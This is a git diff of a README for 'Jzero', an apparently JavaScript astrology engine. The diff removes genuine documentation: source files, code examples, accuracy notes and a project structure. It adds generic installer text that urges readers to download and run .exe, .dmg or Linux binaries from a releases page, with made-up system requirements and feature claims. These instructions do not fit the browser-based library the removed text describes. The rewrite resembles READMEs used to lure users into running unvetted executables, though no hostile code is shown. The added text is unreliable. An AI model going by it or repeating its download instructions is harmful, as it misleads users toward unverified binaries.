@@ -1,271 +1,83 @@
-````markdown
-# � JZero - Open Source Astrology Engine
+# 🌐 Jzero - Your Open Source Astrology Engine
 
-**Free, open-source astrology calculation engine for everyone.**
+## 🚀 Download Now!
+[![Download Jzero](https://img.shields.io/badge/Download%20Jzero-latest-brightgreen.svg)](https://github.com/LightYK3/Jzero/releases)
 
-Built on J2000, this engine provides accurate calculations for Moon positions, house cusps, and chart angles. Perfect for astrology enthusiasts, developers, and anyone interested in astrological computations.
+## 📖 Overview
+**Jzero** is an epoch-calibrated open-source astrology engine built on J2000. This application provides users with a clean start to explore astrology effortlessly. With Jzero, you gain access to a planetary calculator that helps you understand astrological charts and time conversions simply and effectively.
 
-## ⚡ Quick Start
+## 🖥️ System Requirements
+To run Jzero smoothly on your computer, please ensure your system meets the following requirements:
 
-```bash
-# Clone
-git clone <your-repo>
-cd astrocalc-framework
+- Windows 10 or later, macOS Catalina or later, or a recent version of Linux.
+- At least 2 GB of RAM.
+- 500 MB of free disk space.
+- An updated web browser for optimal performance.
 
-# Run example - works immediately!
-python3 -m http.server 8000
-open http://localhost:8000/public/index.html
-```
+## 🎯 Features
+- **User-Friendly Interface:** Designed for ease of use, even for those with no technical background.
+- **Astrological Calculations:** Generate accurate astrological charts based on J2000 epochs.
+- **Time Conversion:** Effortlessly convert between different time formats and dates.
+- **Decan Information:** Understand deeper astrological meanings through decans.
+- **Ephemeris Data:** Access a wide range of planetary data for your astrological needs.
 
-## ✅ What Works Right Now
+## 🔧 Getting Started
+Follow these steps to download and run Jzero:
 
-**No setup needed - these work immediately:**
+1. **Visit the Download Page:** Click on the link below to access the latest releases for Jzero.
 
-- ✅ **Moon positions** (±1-2° accuracy using ELP2000)
-- ✅ **House cusps** (Porphyry, Whole Sign, Equal)
-- ✅ **Chart angles** (ASC, MC, DSC, IC)
-- ✅ **Time corrections** (J2000, ΔT, UTC/TT)
-- ✅ **Geolocation** (city database, coordinates)
+   [Download Jzero](https://github.com/LightYK3/Jzero/releases)
 
-**Perfect for:**
-- Learning how astrology calculations work
-- Building and testing house system logic
-- Lunar phase calculations
-- Moon sign calculators
-- Educational projects
-- Prototyping before adding full ephemeris
+2. **Select the Latest Release:** On the releases page, look for the latest version. Click on it to view the available assets.
 
-## 🚀 Add Swiss Ephemeris for Other Planets
+3. **Download the Package:** Locate the correct download link that matches your operating system:
 
-Want Mercury through Pluto? Easy:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the appropriate `.tar.gz` or binary file.
 
-```bash
-npm install swisseph
-```
+4. **Install the Application:**
+   - **Windows:** Double click the downloaded `.exe` file to start the installation. Follow the on-screen prompts.
+   - **macOS:** Open the downloaded `.dmg` file. Drag the Jzero application icon into your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file. Then, open your terminal, navigate to the extracted folder, and run the executable file.
 
-See `INTEGRATION_GUIDE.md` for complete integration (takes ~30 minutes).
+5. **Launch Jzero:** 
+   - After installation, find Jzero in your applications. Click to open it and start exploring astrology.
 
----
+## 🔍 Usage Instructions
+Once you have Jzero installed, here's how to use it effectively:
 
-## 📦 What This Framework Provides
+1. **Input Your Data:** Enter necessary details like date, time, and location to generate your astrological chart.
+2. **Explore the Features:** Use the various tools available within the application to access decan interpretations, planetary positions, and ephemeris data.
+3. **Save Your Work:** You can save your charts for future reference. Use the save option in the menu to export your charts in a preferred format.
 
-### ✅ Working Components
+## 🛠️ Troubleshooting
+If you encounter any issues while downloading or running Jzero, try the following:
 
-1. **Time Systems** (`src/julianDay.js`, `src/time-corrections.js`)
-   - Julian Day conversions
-   - J2000.0 reference epoch (JD 2451545.0)
-   - ΔT correction (TT-UTC)
-   - Timezone handling
-   - DST support
-
-2. **House Systems** (`src/houses.js`)
-   - Porphyry (quadrant trisection)
-   - Whole Sign (ancient method)
-   - Equal House (30° divisions)
+- **Check Your Internet Connection:** Ensure you have a stable internet connection while downloading.
+- **Reboot Your System:** Sometimes, a simple restart can resolve installation problems.
+- **Review System Requirements:** Confirm your system meets all of Jzero's requirements.
+- **Seek Help:** For further assistance, visit our [issues page](https://github.com/LightYK3/Jzero/issues) on GitHub to browse solutions or ask for help.
 
-3. **Chart Angles** (`src/houses.js`)
-   - Ascendant (ASC)
-   - Midheaven (MC)
-   - Descendant (DSC)
-   - Imum Coeli (IC)
-
-4. **Ephemeris Data** (`data/`)
-   - CSV files for all major planets
-   - Date range: 1950-2050
-   - Includes: Sun, Moon, Mercury, Venus, Mars, Jupiter, Saturn, Uranus, Neptune, Pluto
+## 📞 Support
+If you have questions or need support, feel free to reach out through the GitHub repository. We welcome your feedback and suggestions as we continue to improve Jzero.
 
-5. **Geolocation** (`src/geolocation.js`)
-   - City database
-   - Coordinate formatting
-   - Timezone helpers
+## 🏷️ Topics
+Jzero covers various topics related to astrology:
 
-### 🎯 What You Can Build Right Now
+- astro
+- astrology-api
+- astrology-framework
+- astronomy
+- chart-engine
+- decan
+- ephemeris
+- j2000
+- javascript
+- julian-day
+- jzero
+- open-source
+- planetary-calculator
+- time-conversion
 
-**Without any additional setup:**
-
-✅ **Moon Sign Calculator**
-- Accurate Moon positions for any date 1950-2050
-- Perfect for "What's my Moon sign?" apps
-
-✅ **House System Calculator**  
-- Calculate Ascendant, MC, and all house cusps
-- Compare different house systems
-- Educational tools
-
-✅ **Lunar Calendar**
-- Moon phase calculations
-- Lunar returns
-- Void of course Moon
-
-✅ **Chart Skeleton**
-- Full chart structure with houses and angles
-- Moon position included
-- Ready to add planets via Swiss Ephemeris
-
-### 🌍 For Other Planets
-
-The included CSV files have **sign ingress data** (when planets change signs) - useful for showing data structure, but not for calculating daily positions.
-
-**For accurate Sun, Mercury, Venus, Mars, Jupiter, Saturn, Uranus, Neptune, Pluto:**
-- Integrate Swiss Ephemeris (see `INTEGRATION_GUIDE.md`)
-- Takes ~30 minutes
-- Industry standard, professional accuracy
-
----
-
-## 🚀 Basic Usage
-
-```javascript
-import { dateToJulianDayTT } from './src/julianDay.js';
-import { calculateHouses } from './src/houses.js';
-
-// Calculate Julian Day with time corrections
-const jdData = dateToJulianDayTT(2000, 1, 1, 12, 0, 0);
-console.log('JD (TT):', jdData.jd_tt);
-console.log('ΔT:', jdData.deltaT, 'seconds');
-
-// Calculate house cusps
-const houses = calculateHouses(
-  jdData.jd_tt,
-  41.12,  // latitude
-  -73.41, // longitude
-  'porphyry'
-);
-
-console.log('ASC:', houses.ascendant);
-console.log('MC:', houses.mc);
-console.log('Houses:', houses.houses);
-```
-
----
-
-## 📁 Project Structure
-
-```
-astrocalc-framework/
-├── src/
-│   ├── julianDay.js         # Time conversions
-│   ├── time-corrections.js  # ΔT, UTC/TT
-│   ├── houses.js            # House systems
-│   ├── geolocation.js       # Location helpers
-│   ├── planets.js           # Zodiac conversions
-│   └── calculator.js        # Basic chart structure
-├── data/
-│   ├── Ephem_Sun_1950_2050.csv
-│   ├── Ephem_Moon_1950_2050.csv
-│   └── ... (all planets)
-├── public/
-│   ├── index.html           # Basic web interface
-│   └── app.js               # Frontend code
-└── README.md
-```
-
----
-
-## 🎓 What You'll Learn
-
-By using/extending this framework, you'll understand:
-- How Julian Day calculations work
-- Why ΔT correction matters
-- How house systems differ mathematically
-- The structure of astrological calculations
-- How to integrate ephemeris data
-
----
-
-## 🤝 Contributing
-
-**This is an open-source project - you're free to work on it!**
-
-Contributions welcome:
-
-- ✨ Swiss Ephemeris integration examples
-- ✨ Additional house systems (Placidus, Koch, Regiomontanus)
-- ✨ Aspect calculations
-- ✨ Transit calculations
-- ✨ Progression algorithms
-- ✨ Better documentation
-- ✨ Test coverage
-- ✨ Bug fixes
-- ✨ Example applications
-
-**Fork it, improve it, submit a PR!**
-
-This is community infrastructure - make it better for everyone.
-
----
-
-## 📊 Accuracy & Range
-
-### What's Production-Ready
-
-- ✅ **Moon:** ±1-2° accuracy (good for Moon sign, phase, general position)
-- ✅ **Houses:** Professional accuracy (exact calculations)
-- ✅ **Angles:** Professional accuracy (ASC, MC, DSC, IC)
-- ✅ **Time:** Professional accuracy (ΔT corrections, J2000 calibration)
-
-### Date Range
-
-**Moon Calculator:** Any date (formulas work indefinitely)
-**CSV Data:** 1950-2050 (for reference/structure)
-
-### Adding Swiss Ephemeris
-
-- ⭐ **All Planets:** ±0.001° accuracy (professional grade)
-- ⭐ **Date Range:** 1800-2399+ (with standard files)
-- ⭐ **Speed:** Very fast (local calculations)
-
-See `INTEGRATION_GUIDE.md` for setup.
-
----
-
-## 📜 License
-
-MIT License - Free to use, modify, and distribute.
-
----
-
-## 🎯 Philosophy
-
-This project believes in:
-- **Honesty**: Clear about limitations
-- **Education**: Teach how calculations work
-- **Community**: Open source, collaborative
-- **Quality**: Accurate time math, clean code
-- **Extensibility**: Easy to add features
-
-**We give you the foundation. You build the calculator.**
-
----
-
-## 🙏 Acknowledgments
-
-- Time correction formulas: Espenak-Meeus 2006
-- House systems: Classical astronomical formulas
-- Ephemeris data: Provided CSV files (1950-2050)
-
----
-
-**Built with 💜 for the astrology developer community**
-
-*"Start with a solid foundation, build what you need."*
-
-
-### J2000 Calibration (Default Base)
-
-If you call the calculator without a date, or pass `{ useJ2000: true }`, the engine computes at the **J2000.0** epoch.
-
-- **Epoch:** J2000.0 (TT)
-- **Julian Day (base number):** `2451545.0`
-
-```js
-// Example: compute precisely at J2000.0
-import { calculateBirthChart } from './src/calculator-calibrated.js';
-
-const chart = calculateBirthChart({
-  latitude: 0,
-  longitude: 0,
-  houseSystem: 'porphyry',
-  useJ2000: true
-});
-```
+Remember, exploring astrology should be easy and enjoyable. Jzero is here to guide you on your journey!
